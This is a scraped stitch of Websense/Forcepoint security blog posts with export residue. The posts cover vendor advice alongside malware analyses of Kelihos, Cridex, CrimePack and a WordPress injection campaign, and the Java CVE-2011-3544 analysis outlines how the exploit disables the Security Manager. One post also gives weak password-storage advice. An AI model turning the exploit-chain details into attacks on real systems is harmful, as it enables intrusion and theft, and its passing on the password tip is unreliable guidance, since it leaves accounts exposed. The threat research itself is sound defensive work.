organizations, targeted spear-phishing is a real issue and high risk which you need to do something about. You may think spear-phishing is old news but this is far from the truth. Spear-phishing techniques are increasingly being used as the initial wave in more sophisticated malware attacks designed to steal confidential data. The recent RSA breach, for example, has been widely attributed to spear phishingas the original infection point. Are your company\'s employees aware of the danger, how to spot it, and how to avoid it? Have you tested them to see how many people click on that link? You need to be confident they can stop attacks and most security guys I meet don\'t feel confident about it today. The only strategy I am confident in is a two-fold approach using awareness combined with sandboxing technology. I recommended using Phishme for awareness while also showing you the risk of someone clicking, then combining that with the only email SaaS solution that stops spear phishing using a unique combo of Websense intelligence and sandboxing of any URL we have never seen before or think is shady in anyway.\n5. Clean your Active Directory accounts. Are they up to date? Do they reflect current employees and appropriate access? Make sure you aren’t leaving doors open to cybercriminals by not cleaning these regularly.\n6. Time to review the logs! How much data do you have from all the security logs, IDS, firewall, DLP, web gateways, WAFs, etc.? Spend some time analyzing that data to better understand how the bad guys are trying to get to you and where you might be vulnerable.\n7. While you’re at it, make sure that you are being efficient with those logs, and that your staff is reviewing and monitoring them on an ongoing basis. Consider breaking logs into priority-based tiers. Separate mission-critical apps and the systems/processes that handle your riskiest attack surfaces as your top tier (and make sure they receive the most attention). If you are already managing logs by prioritized levels, consider re-leveling log destinations based on the updated landscape. Some things may have become more critical or vulnerable and others, less so. You’ve also got to make sure that you have the right logs; since your last buying cycle, lots of new systems may have come online.\n8. Review your incident response plan. This is especially important around a data leakage/theft event. Schedule and execute a simulation. This should include the legal team, PR, the CFO, and all of IT. Create a response team with defined responsibilities and processes; otherwise once it happens (and it will) all fingers will be pointed at you.\n9. Outline your accomplishments. Doing so will serve as your internal marketing program, and will get your team recognition. In the past, I’ve spoken and written about ways you can do this—feel free to apply them.\nAnything else you are doing to get ready for the rest of the year? Feel free to post a comment sharing your next priorities.', 'https://www.forcepoint.com/insights/9-tips-csos-get-fresh-start-spring\n');

The problem is big.\nMost IT pros know that by enabling a mobile workforce they are supporting business productivity, but they also recognize the risk. Check out the full results of the survey here.\nI can’t say this often enough: standard mobile device management (MDM) isn’t enough. You really need to look at the new Websense TRITON Mobile Security solution that we announced the RSA Conference. It combines four components (web security, data security, mobile malware / app protection, and mobile device management features). As a cloud security service, it prevents confidential data loss on iPads, iPhones, Android, and other mobile devices.\nFeel free to comment and let me know what you think.', 'https://www.forcepoint.com/insights/survey-results-mobile-security-buzz%E2%80%94-how-big-problem\n');

We have received many questions about who and which websites are in danger and how to protect against this attack. While many forum posts and comments speculate that outdated WordPress versions are at fault, unfortunately, we found that this is not true. We dug a bit into this subject and analyzed 30,000 domains to see what types and versions of CMS (Content Management System) have been compromised so far.\n \nWe checked several aspects of each of these compromised websites and concluded that most of them are served by Apache webserver and PHP environment. As you can see in the pie chart below, PHP dominates the server side:\n\n \nDigging a little deepter, we were also able to examine which CMS were victims of the attack. Initially, when we discovered the attack, we found only WordPress sites, and after a week or so, the picture did not change that much. WordPress still serves the majority of the compromised websites; however, we did see a small amount of other CMS as well. We also noticed that an increasing number of Joomla sites are also affected, with all other content managers making up a tinier slice.\n\n\nThe big question still remains: Is my Website protected if I use the latest WordPress version? Checking all WordPress sites, we conclude that most of the compromised sites were in fact using the most recent version, which indicates that having the latest version of WordPress does not make you immune to this threat. \n\n \nSo how can you protect yourself? Here are some of the dominant attack vectors that websites using the latest WordPress version are likely to be exploited through: \nWeak passwords / stolen credentials\n  Vulnerable third-party modules used in WordPress\n  Security holes in the underlying server infrastructure, such as in the database server or the server side scripting engine (PHP in this case)\n \nWebsense Security Labs strongly recommends that website owners perform security audits and fix all problems to keep attackers away from their sites. Websense customers are protected from injected websites with our Advanced Classification Engine, or ACE, which detects compromised websites in real time.', 'https://www.forcepoint.com/security-labs/i-have-latest-wordpress-version-my-website-protected\n');

Find a formula that works for you, whether it is a simple substitution, like “3” for “e” or a simple cypher replacing letters for numbers that is easy for you to remember. If you must keep a digital version, think about creating a document with your passwords in a file on your computer with a unique title (please don’t call it “passwords”), and change or drop the extension from the file. This isn’t going to thwart the smarter bad guys from finding it, but it is better than the little notebook of passwords in your top desk drawer.\nWith daylight savings, some loathe the idea of losing an hour of sleep, while others rejoice in the prospect of experiencing sunshine again at the end of a workday.

We only run across OpenDNS once in a while, typically for extremely price-conscious customers. But cheap comes at a cost and when the solution is insufficient the savings can’t be justified. \nOpenDNS works by using their cloud-based DNS servers as URL filter databases. Since the huge majority of web requests require DNS resolution to match an IP address to a URL domain name, they provide filtering by having an objectionable URL map to a block page location rather than to the web site. \nOpenDNS sells to a lot of schools, so let’s look at a relevant example: \nConsider where a category is open by domain rating, but parts of the site violate Children\'s Internet Protection Act compliance. For instance, Playboy inside of Facebook. Or numerous other porn sites that hide within social networking sites. If social networking is allowed, then all that porn comes through within these sites (even more so on user pages shared within social circles). So the cases where students will see porn when they shouldn’t—a false negative—are much higher with OpenDNS. All it takes is one or two incidents exposed at the local school board level to realize the solution is far from sufficient. \nAnd Open DNS has a number of pretty severe shortcomings vs. Websense Web Security Gateway: \nThe system has no user awareness. Policies are set by IP address range only, so there is no granularity. For example, you can only set one policy per network. This can be problematic if you want to set less restrictive policies for one group (e.g., teachers) than another (e.g., students).\n    They don’t actually inspect any content in real-time. They rely on either their users identifying and reporting bad or inappropriate sites or open-source public black lists. These mechanisms are not at all good at detecting new or modified threats. Websense collects 3-5 billion pieces of content per day from the internet and has built real-time analytics on-box to accurately identify content from web pages that change every day—be it to catch web-based malware or categorize inappropriate content.\n    They block at the domain level, not the page level. DNS queries only resolve the top level domain, not the individual pages. Therefore you get one-size-fits-all filtering. All Facebook pages are treated the same, with no ability to identify malicious or inappropriate pages within the domain.\n    Modern malware comes from trusted top level domains that OpenDNS allows with no real-time analysis on lures, redirects, or web-page content.\n    A long list of other traditional URL filter features are missing: quotas, polices by time of day, etc.\nBy the way, Websense Web Security Gateway just won TWO SC Magazine awards:\n\nBest Enterprise Security Solution\n    Reader’s Trust Award\nSo the review experts and the customers seem to agree!', 'https://www.forcepoint.com/insights/websense-web-security-gateway-vs-opendns\n');

Very interesting also was the recent official Microsoft response  where has been confirmed a new generation of Kelihos variants derived from the previous. The Websense® Security Labs™ Spam Trap system has detected a variant of Kelihos that is apparently still active.\n\nWe focused our research on trying to uncover the Kelihos command and control infrastructure and P2P network, along with some features of the botnet that we could recognize, including enhancements. The first interesting thing we noticed was in a sample of the network traffic generated by the bot before it starts its spam activity. As shown below, the bot generates a first request to an IP address that is listening on HTTP port 80:\n\n \nWe detected encrypted traffic between the \"infected\" host and the IP addresses shown above. The server contacted by the bot answers with another encrypted network stream. Before the bot starts to generate spam, it contacts another IP address, this time with an HTTP GET request, as shown in the following screen shot:\n\n \nIn this screen shot, we see that the \"User-Agent\" header string specifies a dodgy user agent, and that the traffic between the URL requested by the bot and the contacted server seems to be encrypted. Our investigation found that the last stream received by the bot is the configuration information that permits it to begin generating spam. This information includes the targeted countries, a list of recipients, a template for the email body, and a list of MX records needed to start the campaign.\nFrom the statistic analysis of this binary (MD5 021EC96775A37AE92680C076295D5991), we can confirm that the new generation of Kelihos uses an encryption mechanism based on Blowfish. Using some of our tools of the trade, we reversed the binary and detected evidence of a statically linked instance of the cryptographic open source library called Crypto++. Further investigation using a tool called PEiD provided the needed confirmation of this: \n\n \nThis knowledge permitted us to start a more detailed investigation using a reverse engineering process. After we observed that the first IP address contacted by the bot was changed using a non-apparent criterion, we started to understand where that IP address was retrieved. We were unable to retrieve anything from a memory dump during the bot\'s runtime. However, a review of the memory contents revealed that some \"hard coded\" information in the bot was protected by a sort of in-memory mechanism based on encoding and encryption. In other words, the vital parameters that allow this bot to exist were not easily detectable because they were located in an area of the code where custom obfuscation was applied. When we looked for some IP addresses in memory, we detected the code routine used to decrypt the IP addresses (probably all compromised hosts). What follow is a dump snippet from the memory after the decryption routine: \n\n \nThe above screen shot shows the area of the bot\'s memory after the decryption routine extracts the first IP address to contact. The bot then starts the network conversation that we showed in the network traffic screen shot at the beginning of this blog. We found a total of 499 IP addresses in the bot\'s memory. Extracting this list from the bot, we can (thanks to Google Maps) represent graphically how widespread the Kelihos command and control and peers infrastructure is. The following illustration shows the geographical distribution of just 100 of those IP addresses chosen randomly from the list. Given the numerous locations shown, you can see how well this botnet is protected:\n\n \nWhen we extracted the country code from the IP addresses, we generated the following graph, which shows the 20 countries that are home to most of the Kelihos command and control and peers systems:\n\n \nMore investigation of Kelihos spam activity revealed that this botnet is involved in several malicious campaigns, including the following phishing attempt:\n\n \nOur Websense ThreatSeeker® network can detect this spam activity and block the communication between the Kelihos bot and its command and control and peers structure. The following screen shot shows how a Websense customer is protected against the phishing attempt shown in the mail above:\n\n \nDuring our investigation, we also detected and trapped the following email messages generated by the Kelihos bot. We can see from this list that the campaign is targeted primarily for European and USA email addresses: \n\n \nWe could say much more about the Kelihos botnet. For example, the code seems to be derived and recycled from or other malicious code close to Waledac variants. We have detected some evidence of Infostealer activities targeting well-known FTP clients, the presence of a routine that acts like a Bitcoin wallet stealer, and a list of suspicious User Agents used by the bot to contact its command and control and other peers machines. Anyway, the most important thing derived from this analysis is that we have retrieved the entire list of the command and control systems.\n \nWebsense customers are protected from these threats by ACETM, our Advanced Classification Engine.', 'https://www.forcepoint.com/security-labs/long-life-kelihos\n');

According to DatalossDB and the 2011 Data Breach Investigations Report by Verizon, the number of records compromised per year has been decreasing since its 2008 peak. But these reports are missing something very important. It all comes down to what is reported. Last year I met with more than 450 CIOs and CSOs, and almost all of them said that incidents are way up. New breaches are constantly making headlines, so why is there a discrepancy between our perception and what these reports are finding?\nMany industry reports focus on the never-ending stream of leaked or stolen personally identifiable information (PII). Most laws and industry standards, such as PCI DSS, also concentrate on PII. But there is something that could be more dangerous to lose than PII and that isn\'t getting enough attention in data breach reports—intellectual property (IP).\nAs records show, stealing PII (credit cards, social security numbers, and so on) used to be big business for cybercriminals. Then it started to get a bit harder for hackers to get PII because overall awareness increased as more regulations were passed and organizations started to invest in information security solutions. Verizon\'s Data Breach Investigations Report states, \"Our leading hypothesis is that the successful identification, prosecution, and incarceration of the perpetrators of many of the largest breaches in recent history is having a positive effect.\" Researchers also suggested that there are fewer hackers and the threat they pose is losing prominence. I believe protection enforcement is a factor in the reduction of PII theft, but I don\'t believe there are fewer bad guys out there. In fact, quite the opposite: The threat has never been greater than it is now.\nThe next big thing is stealing IP, which includes product designs, secret formulas, and other trade knowledge. It\'s what organized cybercrime, state governments and hackers are all going after. Why? Mostly because of the value of the data. One stolen manufacturing process can be worth millions in saved development costs or billions in market share.\nNot protecting IP is a huge mistake for companies and countries alike. Intellectual property is what makes modern nations competitive in the world economy. It fuels innovation and development, and it keeps you ahead of the competition.\nWhat do CSOs think? More than 70 percent of the CIOs and CSOs I spoke with last year said their IP is under attack. Yet only 30 percent of them have data-loss prevention (DLP) tools in place. And most of them do not have software to protect their data in the cloud or on mobile devices, which are the two big new blind spots that they need to worry about.\nWhy IP Loss Isn\'t Making Headlines\nFirst, no one is making companies disclose IP loss. When PII is exposed, laws such as HIPAA and HITECH demand companies disclose that information, but no similar laws exist for IP loss. Only the SEC has come out and said that if IP is stolen and that could have material financial impact on your company, you should disclose that. For example, if a competitor in China gets your IP and could manufacture a similar product, you should disclose that.\nSecond, companies often have no idea when their IP is compromised. When credit card numbers and other PII is hacked, you tend to find out quickly because the bad guys make money on the breach. They quickly sell the credit card information on the black market, and that data gets used. At that point, the banks know the card numbers were stolen and the forensic trail leads back to the hack. Most companies know the importance of protecting PII and have controls to prevent and detect hacks. But IP is perceived as harder to protect and hasn\'t been a major focus for companies. The reality is that IP is the hottest target for cybercriminals, your competitors and malicious employees. It will only get worse.\nThird, the bad guys know how to sidestep traditional defenses. They use a common blind spot in most companies\' defenses—SSL. Most anti-malware security solutions don\'t look out for man-in-the-middle attacks decrypting the SSL traffic coming into the network. SSL accounts for up to 50 percent of Web traffic, and criminals know that most IT security systems do not inspect it.\nFourth and finally, DLP software isn\'t being used to its fullest potential. Most companies aren\'t looking at the SSL traffic, but as services such as Gmail move to automatically send all traffic to SSL, this becomes more of an issue. If you don\'t inspect in SSL, your DLP solution is giving you a false sense of security.\nFour Ways to Protect Your IP\nWe need to protect our most valuable asset, IP, from criminals\' attempts to steal and subvert it. This is one of my focus areas, and here are three steps I recommend for better protecting your sensitive information:\n1. Get DLP, but forget the endless discovery process. Gartner Research says that about 30 percent of companies have DLP and another 30 percent are considering it. But the massive \"discover everything\" process that vendors often recommend is ridiculous. Here\'s all you need to do to get started: Understand what IP is the most valuable 1 or 2 percent and protect it accordingly. I care less about where every nugget of information is than I do about the crown jewels.\n2. Educate your teams on the right practices for handling this data. Again, this is about the 1 or 2 percent that\'s the most valuable data you have. Work with the people who have access to this data, including the Board of Directors and engineers. Talk to them about how to handle this data and set good controls for admins. Eliminate admin rights on desktops. Then reinforce the training through mock social engineering attempts and penetration testing. I use sites like PhishMe.com. There are good companies out there that can help you with this and measure the success of your education efforts over time.\n3. Reinforce your education with technology. In addition to DLP, you need a few must-have protections for securing your top data. You need to be able to monitor your two biggest communications channels (Web and email) for outbound data and you need to be able to stop it in its tracks. (Disclosure: Yes, this is what my company\'s products do.) Identity- and access-management tools are increasingly useful for ensuring that data doesn\'t fall into the wrong hands. And using security information and event management software with a solid log-management tool (that you actually pay attention to) can help you identify suspicious behavior and follow it all the way through to remediation of the threat. Be diligent here, and add your findings to training materials. Because while the reporting features of these tools are getting better, you still need to have highly trained eyes regularly analyze the output to ensure that you are truly protected.\n4. Focus on your blind spots. Your biggest IP data blind spots are\non your mobile devices,\n  in cloud services,\n  and in SSL traffic.\nMake sure to pick a strategy and solutions that can give you visibility into these areas as more and more of your data moves off your controlled network. Don\'t forget to include consumer cloud services such as Dropbox and Box.net.\n\nIt\'s Time to Pay Attention to IP\nIn early 2011, Nasdaq\'s director\'s desk was hacked. Imagine how much money cybercriminals could make if they had visibility into your company dealings the way they did with that breach. The Nasdaq hackers could have made billions by trading with this insider information, which is far more than they could have made stealing credit card numbers.\nThink about your company\'s crown jewels. How much would your company lose if its IP was stolen by a competitor overseas, where IP protection isn\'t enforced? The trend of hackers going after IP is just getting started and will grow rapidly in the next two years. But there are ways you can protect your IP and save your company serious headaches.

Hardly surprising. But when the source is Google\'s famous AdWords advertising service—one of the internet giant\'s main sources of income—then a double take might be in order.\n\nA BBC investigation found that a Google search for \"olympic tickets\" resulted in top-of-the-page placement of sponsored sites for vendors selling tickets without permission from Olympic authorities, which is a criminal offense in the U.K. under the London Olympic Games and Paralympic Games Act 2006. \nOur research confirmed that the Google search shown below displays an AdWords link \n\n \n\nthat is not authorized to sell Olympic tickets according to the ticketing website checker on the official London Olympics website. \n\n \nThe prominent display of sponsored ads tends to confer on them a sense of legitimacy. Users may assume that Google has approved the businesses, or at least stands behind them in some way. But in response to a complaint from a would-be Olympic ticket purchaser, Google said, \"While Google AdWords provides a platform for companies to advertise their services, we are not responsible for, nor are we able to monitor the actions of each company.\" \nThe inner workings of AdWords are complex and opaque. These qualities are essential, because if Google revealed its algorithms, for example, people could easily cheat their way to the top.  While the automated system does take into account something called \"Quality Score\" and consumer ratings, it\'s clearly not foolproof. A filtering system flags certain keywords for manual review and removal if the ad is found to violate Google\'s policies, and users can also fill out an online complaint form. Due to the volume of ads, however, a questionable ad may be up for some time before it is reviewed. \nWebsense® researchers investigated some of  the Olympic ticket scam sites. We found that most of them had multiple backlinks, suggesting they have been widely spammed over the internet in addition to being promoted via Google AdWords. A \"backlink\" is a hyperlink that links to a specific web page. Both legitimate web pages and spam URLs often try to set up as many backlinks as possible to drive traffic to their sites, and the number of backlinks a site has may affect its ranking in search engine results. Like the hyperlnks in this post, links can be used to provide additional context, information, or examples. \nAn examination of these backlinks confirmed that \"birds of a [bad] feather flock together.\" One URL yielded 500 backlinking URLs in categories such as Adult Material, Gambling, Proxy Avoidance, Potentially Unwanted Software, Suspicious Embedded Links, and Malicious Embedded Links. \nA set of 375 backlinks for another URL found that 104 (27.73%) included various kinds of objectionable content, including security risks (the remaining URLs either had no backlinks or had backlinks for legitimate sites such as News and Media, Business and Economy, and so on).  The breakdown for objectionable/security risk backlinks was as follows: \n\n \nA closer look at just one of the backlinks tells us a lot about the dangers of allowing comments that are not moderated to be added to any site. In this case, a perfectly legitimate website for a church posted a video of a Sunday School Christmas play and invited viewers to comment:\n\n \nViewers and spammers did exactly that, adding links not only to the Olympic ticket scam we started with, but also to a variety of other completely unrelated businesses which may or may not be legitimate, including German gambling and phone sex sites and an Italian \"escort\" agency:\n\n \nDefensio from Websense is one way to prevent spammers from posting such links on blogs and other social media, including Facebook pages. With this service, it\'s easy to block and manage comments, protecting you and your followers from comment spam, malware, and other threats embedded in user-generated content. \nWith Google searches as with everything else, do your own \"due diligence\" before making a transaction, even if the business is at the top of the page. In the case of London Olympics tickets, the official website includes the handy ticketing website checker that we used to determine if a URL is recognized as an authorized vendor.

Based on my analysis, the site was compromised because it was running an old version of Wordpress (3.2.1) that is vulnerable to publicly available exploits [1] [2]. The Web site injection is only somewhat interesting. What is more interesting is the redirection chain and resulting exploit site, which might be a new or updated Exploit Kit to watch out for.\n \n* Update 2012/02/06: After obtaining access to logs and PHP files from compromised Web servers, further analysis indicates that most of the compromised Web sites were running older versions of WordPress, but they were not all running 3.2.1. The attackers’ exact point of entry is uncertain. At first, we suspected vulnerable WordPress plugins, because a subset of analyzed sites were running vulnerable versions of the same WordPress plugins. Now that we have access to data from several compromised Web servers, the logs show us that, in some cases, the point of entry was compromised FTP credentials. In several instances, once attackers had access, they scanned WordPress directories and injected specific files (e.g., index.php and wp-blog-header.php) with malicious PHP code.\n \nOur research indicates that whoever is behind the injection has infected other sites. From our analysis the number of infections is growing steadily (100+). \n \nThe Injection\nThe site was injected with the following code segment:\n\n \nThe above code is a simple substitution cipher algorithm that applies a basic obfuscation technique, which when deobfuscated produces the following code:\n \n\n \nThe code above instructs the Web browser to write an iframe to the document of the Web page:\n\n \nOnce the iframe is written to the Web page, the code forces a connection to the malicious site, which downloads content to the user\'s machine (all without the user\'s permission or knowledge). The malicious Web site serves a page that we assume includes the Incognito Exploit Kit, because one of Incognito\'s characteristics is that it uses showthread.php as the Web page filename to serve user exploits. We are still not positive if this is Incognito 2.0 or a completely unknown exploit kit. Most kits, much like Incognito, test the user\'s browser and/or OS type and version and serve the user various exploits, e.g. PDF exploits, or browser specific bugs. But this Exploit Kit appears to serve only the below Java exploit:\n\n  New or Updated Exploit Kit?\nThe Java exploit being served is CVE-2011-3544 (Oracle Java Applet Rhino Script Engine Remote Code Execution), which most Exploit Kits adopted in December 2011 because it is cross-platform and exploits a design flaw. Normally, kits use a variety of exploits, but as can be seen in the screen shot below, regardless of what OS or browser we used for testing, this Exploit Kit attempted to exploit ONLY our Java Runtime Environment (JRE). It did not attempt any other exploit.\n\n \nExploit and Dropped Malware\nThe Java exploit that is used isn\'t a traditional buffer overflow, it takes advantage of a  design flaw within Rhino, the JavaScript engine that runs under the JVM and interacts with Java applets\n\n  An attacker can bypass the Rhino scripting engine protection by generating an error object, which runs in elevated privileges and executes code that disables the Security Manager. Once the Security Manager is disabled, the attacker can execute code with full permissions.\n\n  If the user isn\'t patched and is therefore vulnerable to CVE-2011-3544 (see patch details here), two Java files (VirusTotal links [1] [2]) drop Tdss (Virus Total link [1] = 9/43). The Tdss rootkit is one of the stealthiest rootkits in the wild. Its goal is to acquire total control of infected PCs and use them as zombies for its botnet.\n \nPrevalence of Injection Campaign\nSince we started tracking this infection this past weekend, we have discovered that this is an infection campaign. The Websense® ThreatSeeker® Network has found 100+ compromised Web sites, all with similar infection characteristics. The compromised Web sites all share these traits:\nRunning WordPress 3.2.1\n  Force a drive by download via iframe to the same malicious set of domains hosting a PHP Web page in the form of: [subdomain].osa.pl/showthread.php?t=.*\n  Attempt exploitation using CVE-2011-3544\n  If exploitation is successful, installation of the Tdss rootkit on the user\'s machine\n \nHere is an example listing of sites that have been infected:\n\n \nThe number of Web pages running the vulnerable, targeted version of Word Press 3.2.1 is in the hundreds of thousands. It is unknown at this time how the attackers are choosing which sites to infect.\n\nWhat To Do If You Are Running WordPress 3.2.1\nIf you\'re running WordPress 3.2.1, we recommend that:\nYou upgrade to the latest stable version of WordPress.\n  Check the source code of all your Web pages to see if you\'ve been infected (see the code above). If you have been infected, be sure to upgrade WordPress while simultaneously removing the injected code so that your Web pages aren\'t simply being reinfected after being cleaned.\n \n\nNotifying Compromised Web site owners\nAs a matter of practice, we attempt to notify certain sites of their infection. First we use the email address that appears in the \"Contact Us\" section of the site, and then we use the email address in the whois registration database. If those attempts are unsuccessful, we attempt to notify a site owner through their facebook page (we have had very good success with this technique). Our recommendation when attempting to take down malicious URLs is to follow the best practices described in a document published by StopBadWare.org (found here).\n \nWebsense customers are protected from these threats by ACETM, our Advanced Classification Engine.\n \n* Update 2012/02/01: If you realize after reading this blog that your Web site has been compromised, leave a comment (it won\'t be published) with your contact details, and we will contact you\n \nThanks,\n\nStephan Chenette - Principal Security Researcher', 'https://www.forcepoint.com/security-labs/3-2-1-wordpress-vulnerability-leads-possible-new-exploit-kit\n');

In this blog, we take a look at a recent malware variant from the wild caught on camera that shows CAPTCHA tests used by some online services are still weak and can be broken by malware. \nThe image below (Picture 1) shows this CAPTCHA breaking malware\'s ecosystem, which we\'ll describe step by step. Step 1: The starting point of an infection is a banking Trojan variant known as Cridex. This variant is propagated via malicious email messages that hold shortened links leading to exploit kits (see this example), in our case the Blackhole exploit kit. Step 2: If the exploit is successful, the Cridex variant is downloaded to the machine. Step 3: Cridex runs on the machine. Step 4: Cridex is a data-stealing Trojan that is similar to Zeus in the way it operates: It logs content from Web sessions and alters them to harvest information from the infected user. The Cridex configuration file downloaded by this variant (safe to view and download and shortened here) shows which websites the variant monitors and steals data from, along with Web form injection points (data alteration injected into Web forms to harvest additional data like ATM PIN numbers). We have observed that Facebook, Twitter, and many banking services are targets. A partial list of targeted websites can be foundhere. Step 5: Any stolen data from the system is uploaded to a command and control server.\n \nPicture 1: The Cridex ecosystem:\n\n \nStep 6: One of the components downloaded by Cridex with the configuration file is a propagation module or spamming module that allows the botmaster to send spam/malicious emails to infect other systems and increase the bot size. The spamming module holds backdoor components that allow browsing activities in the name of the user. The module opens Web sessions to online mail services and registers new email accounts that are later used by the bot to send spam/malicious emails. As we know, online mail services hold security checks like CAPTCHA challenges to verify that a human is indeed behind any account registration. Step 7: According to our findings, CAPTCHA challenges in some cases can be broken with the help of a CAPTCHA-breaking server, which allows the bot to register a mail account or address after only a few attempts. This video documents the registration of an online mail account by the bot on an infected machine:\n \nVideo:\nClick here to watch the video on Youtube\n\n  \n    \n\n  \nThe CAPTCHA-breaking process consists of posting CAPTCHA challenge images harvested from the online email registration form to a remote Web server (the CAPTCHA-breaking server). The request is an HTTP POST with an embedded CAPTCHA image posted to the CAPTCHA-breaking server. Once the server processes the image, it outputs a response in JSON format with the CAPTCHA text result that responds to the submitted image (see Picture 2). The backdoor component then tries to use that returned CAPTCHA text result in the online email account registration form. In case the CAPTCHA-breaking server output is wrong and does not correspond to the CAPTCHA image challenge, the process continues and the next CAPTCHA image challenge is submitted until the server manages to break the CAPTCHA. You can look at Picture 3 to see the images submitted to the CAPTCHA-breaking server and the corresponding results from the server. Not all the attempts succeed in breaking the CAPTCHA, but some do and in our example you see it took 6 attempts. \nThe malware reports to the CAPTCHA-breaking server whether the result it got actually broke the CAPTCHA. Picture 4 shows HTTP requests that report back to the CAPTCHA-breaking server whether the CAPTCHA result the server gave in previous sessions was indeed successful in breaking the CAPTCHA. A successful CAPTCHA break is signed with the rparameter: If the parameter is 0 (&r=0), the CAPTCHA break attempt was unsuccessful, whereas if the parameter is1 (&r=1), the CAPTCHA break attempt was a success. \nPicture 2: An HTTP POST request of an image to the CAPTCHA-breaking server and the response from the server\n\n \nPicture 3: The images posted to the CAPTCHA-breaking server and their corresponding results\n\n \nPicture 4: The malware reports to the CAPTCHA-breaking server if the CAPTCHA break attempt was successful\n\n \nWebsense® customers are protected from these threats by ACE™, our Advanced Classification Engine.', 'https://www.forcepoint.com/security-labs/trojan-caught-camera-shows-captcha-still-security-issue\n');

Data is everywhere and its value is growing exponentially. But with data moving in and out of your organization so quickly—how can you keep it safe? \nThis is the perfect time of year to ask that question—today is Data Privacy Day. The National Cyber Security Alliance has coordinated various events in the United States and Canada to help facilitate discussions and raise awareness of data privacy and security issues.\nIn my opinion, the public and private sector must work together to combat the rising tide of data-hungry cyber criminals. Government legislation is and has been making strides toward mitigating cyber crime. In the U.S., 48 out of 50 states now enforce data breach notification laws, which require companies that collect or store personal identifiable information to notify customers if their information is compromised.\nAnd, in Canada, mandatory data breach notification may soon become federal law. The Canadian Parliament is currently reviewing Bill C-12, a proposed update to Canada’s existing privacy law, the Personal Information Protection and Electronic Documents Act (PIPEDA). At present, PIPEDA currently does not contain any breach notification provisions.\nHowever, as we all witnessed in 2011, legislation alone cannot protect data. According to an upcoming study from the Identity Theft Resource Center (ITRC), previewed in advance by Information Week, in 2011, there were 419 breaches publicly disclosed in the U.S., affecting a staggering 22.9 million records.\nThis means we still have A LOT of work to do. And, consumers are losing patience. They hold businesses directly accountable for the loss of their personal data and continue to bring class action lawsuits against organizations. This consumer unrest is likely to fuel additional legislation that may punish companies financially for losing customer data. Corporations have to take responsibility.\nHere are three key recommendations for protecting customer data:\n1. Educate your teams on best practices for handling customer data.\nWork with the people who have access to customer data, including accounting, customer service and engineers. Talk to them about how to handle this data and set good controls for admins. Eliminate admin rights on desktops. Then reinforce the training through mock social engineering attempts and pen testing. There are good companies out there that can help you with this and measure the success of your education efforts over time. \n2. Reinforce your education with technology.\nA few must-have protections are essential for securing customer data. Monitor your two biggest communications channels (web and email) for outbound data and be able to stop it in its tracks. An integrated, effective secure web gateway and data loss prevention (DLP) technology provides greater control to more effectively manage who and what can go where, offering protection from inbound threats and outbound data in a unified solution. This step can also help determine who is using what information and whether the data is legitimately or inappropriately used. Identity and access management are increasingly important tools to ensure that the data doesn’t get in the wrong hands. And using Security Information Event Management (SIEM) software with a solid log management tool (that you actually pay attention to) can help you identify suspicious behavior and follow all the way through to remediation of the threat. Be diligent here, and tie it back to training. Because, while the reporting features of these technologies are getting better, you still need to develop highly trained eyes to regularly analyze the output to ensure that you are truly protected.\n3. Make Data Privacy Day last longer than a day.\nLet\'s face it, a day of awareness is fantastic, but a lifetime of action is more significant. Protect sensitive customer data in your organization as if it was your own, every day. We need to take action to do this, or the bad guys will act to take it from us. What are you currently doing to celebrate Data Privacy Day, every day?', 'https://www.forcepoint.com/insights/top-3-data-security-tips-celebration-data-privacy-day\n');

Let\'s start by visiting the home page of entrepreneur.com where we notice an iframe injected into the page:\n\nPicture 1: Hidden iframe injected into the home page of entrepreneur.com\n\n\nWe know this is an invisible iframe since its height is zero. This is suspicious enough to make us analyze the content of the target URL. Our analysis reveals that it contains a highly obfuscated JavaScript code (Picture 2).\n\nWe need to de-obfuscate it to see if this is malicious or not. On the first layer of de-obfuscation, we immediately notice that something is not quite right. The code tries to access the Java engine in various ways and loads a module named \"cpack,\" which we surmise could be the CrimePack-generated code (Picture 3).\n\nTo confirm our suspicions, we need to de-obfuscate the second level, too, to get a clear overview of what redirections have been utilized during visits to this page. After de-obfuscating the second level, we see that the code creates another iframe that loads the \"bof.php\" file from the malicious server (Picture 4).\n\nFrom its source code (Picture 5), we ascertain that this \"bof.php\" file is part of the CrimePack exploitation module.\n\nIf we take a second look at the index.php, we notice that it loads another JavaScript code called “detect.js” (Picture 6). This is a module that helps determine which plugins are installed in the browser. The exploit kit then uses this information to create a vulnerability matrix that describes what type of exploit can be successfully used in a user’s particular environment (Picture 7). \n\nPicture Gallery:\n\nPicture 2: Highly obfuscated JavaScript code on the malicious site\n\n\nPicture 3: Various modules are loaded from the first layer of de-obfuscated code\n\n\nPicture 4: Java classes and iframes injected from the second layer of obfuscated code\n\n\nPicture 5: CrimePack delivers Java exploit code to a user’s browser\n\n\nPicture 6: A malware helper module uses a legitimate “Dean Edwards” obfuscation method\n\n\nPicture 7: The helper module checks what plugins are installed on the browser enabling CrimePack to  build a vulnerability matrix', 'https://www.forcepoint.com/security-labs/entrepreneurcom-compromised-crimepack\n');

Their targets are not limited to social web, but also include popular and frequently-visited registered typosquatting domains in all areas ranging from Google to Victoria\'s Secret, or Wikipedia to Craigslist; the list goes on. The attacker registers a network of typosquatting domains and redirects visitors of these mistyped sites to a spam survey site. The Websense® ThreatSeeker® Network has discovered over 7,000 typosquatting sites within this single network. \n\n \nThese typosquatting sites redirect visitors to a suspicious URL via a URL shortening service. From there, they take them to a spam survey site (which we showed you in this blog). After visitors complete the spam survey, they are then taken to spam advertisement distributed sites where spam advertisements are displayed based on the their interests. An example of such advertisment is a free movie downloader as shown below. Currently, these spam advertisements are not spreading maliciously. However, if these networks are resold to underground groups, then the potential outcome could be even more damaging than the 0-day exploit security attacks.\n\n\nYou\'d surprised by the number of visitors who mistype popular domain names.

